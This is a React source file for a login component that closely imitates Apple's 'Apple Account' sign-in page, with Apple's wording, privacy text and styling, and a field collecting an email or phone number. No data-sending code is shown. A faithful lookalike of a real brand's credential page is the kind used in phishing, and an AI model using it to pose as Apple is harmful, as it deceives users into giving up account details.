import { useEffect, useRef, useState } from "react";
import { Landing } from "../components/Landing";

const PRIVACY_TEXT =
  "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";

export default function Login({ onContinue }) {
  const [value, setValue] = useState("");
  const [focused, setFocused] = useState(false);
  const inputRef = useRef(null);

  useEffect(() => {
    // Apple focuses the first field on pointer devices; on phones the keyboard stays closed.
    if (window.matchMedia("(min-width: 735px)").matches) {
      inputRef.current?.focus();
    }
  }, []);

  const small = focused || value.length > 0;

  return (
    <Landing>
      <div className="mb-[50px] flex min-h-[410px] justify-center">
        <div className="w-[min(460px,calc(90vw_-_10px))] pb-[5px] pt-[9px] max-[405px]:pb-[6px]">
          <h1 className="text-center font-display text-[24px] font-semibold leading-[28px] tracking-[0.216px] text-[#1d1d1f] min-[767px]:text-[28px] min-[767px]:leading-[32px] min-[767px]:tracking-[0.196px] min-[1069px]:text-[32px] min-[1069px]:leading-[36px] min-[1069px]:tracking-[0.128px]">
            Apple Account
          </h1>
          <p className="mt-3 text-center text-[17px] leading-[25px] tracking-[-0.374px] text-[#1d1d1f]">
            Manage your Apple Account
          </p>

          <form
            className="mt-[32px]"
            onSubmit={(e) => {
              e.preventDefault();
              if (value.trim() && onContinue) onContinue(value.trim());
            }}
          >
            <div className="relative h-[56px] w-full">
              <input
                ref={inputRef}
                type="text"
                id="account_name_text_field"
                enterKeyHint="done"
                autoCorrect="off"
                autoCapitalize="off"
                spellCheck="false"
                required
                autoComplete="off"
                aria-required="true"
                aria-invalid="false"
                aria-labelledby="apple_id_field_label"
                value={value}
                onChange={(e) => setValue(e.target.value)}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                className={`h-[56px] w-full rounded-[12px] border-solid bg-[rgba(255,255,255,0.8)] pr-[43px] pt-[18px] text-left text-[17px] leading-[21px] tracking-[-0.374px] text-[#494949] outline-none transition-[border-color,background-color] duration-150 ease-in ${
                  focused ? "border-2 border-[#0071e3] pl-[15px]" : "border border-[#86868b] pl-4"
                }`}
              />
              <span
                id="apple_id_field_label"
                aria-hidden="true"
                className={`pointer-events-none absolute left-[17px] block overflow-hidden text-left text-[#6e6e73] transition-all duration-[125ms] ease-in ${
                  small
                    ? "top-[10px] text-[12px] leading-[16px] tracking-[-0.12px]"
                    : "top-[18px] text-[17px] leading-[21px] tracking-[-0.374px]"
                }`}
              >
                Email or Phone Number
              </span>
            </div>

            <div className="mt-[44px]">
              <div className="h-5 w-[26px] bg-[url('/assets/privacy-muted.svg')] bg-cover bg-center min-[767px]:h-[29px] min-[767px]:w-[37px]" />
              <p className="mt-3 text-left text-[12px] leading-4 tracking-[-0.12px] text-[#1d1d1f]">
                {PRIVACY_TEXT}{" "}
                <a
                  href="https://www.apple.com/legal/privacy/data/en/apple-id/"
                  target="_blank"
                  rel="noopener"
                  className="text-[#0066cc]"
                >
                  See&nbsp;how&nbsp;your&nbsp;data&nbsp;is&nbsp;managed...
                </a>
              </p>
            </div>

            <button
              type="submit"
              disabled={!value.trim()}
              className="relative mt-[33px] block h-[38px] max-[405px]:mt-[32px] w-full rounded-[8px] border border-transparent bg-[#0071e3] px-[15px] py-[8px] text-center text-[14px] leading-[20px] tracking-[-0.224px] text-white transition-[background-color,transform] duration-150 ease-out hover:bg-[#0077ed] active:scale-[0.99] disabled:opacity-[0.42] disabled:hover:bg-[#0071e3]"
            >
              <span className="text-[14px] leading-[20px]">Continue</span>
            </button>
          </form>
        </div>
      </div>
    </Landing>
  );
}
